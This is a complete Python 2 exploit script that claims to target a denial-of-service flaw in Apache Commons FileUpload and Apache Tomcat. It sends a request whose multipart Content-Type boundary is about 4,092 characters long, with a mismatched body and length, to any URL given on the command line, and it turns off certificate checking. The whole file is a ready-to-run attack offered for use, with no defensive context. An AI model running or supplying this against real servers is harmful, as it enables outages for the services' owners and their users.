#!/usr/bin/python
# -*- coding: utf-8 -*-

import urllib2
import httplib
import ssl


def exploit(url):
    boundary = '0'*4092
    payload = "multipart/form-data; boundary="
    payload += boundary

    data = (boundary + '00000')

    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        
        headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type': payload, 'Content-Length': '4097'}
        request = urllib2.Request(url, headers=headers, data=data)
        
        page = urllib2.urlopen(url=request, context=ctx).read()
    except httplib.IncompleteRead, e:
        page = e.partial

    print(page)
    return page


if __name__ == '__main__':
    import sys
    if len(sys.argv) != 2:
        print("[*] exploit.py <url>")
    else:
        print('[*] CVE: 2017-0050 - Apache Commons FileUpload and Apache Tomcat DoS')
        url = sys.argv[1]
        exploit(url)
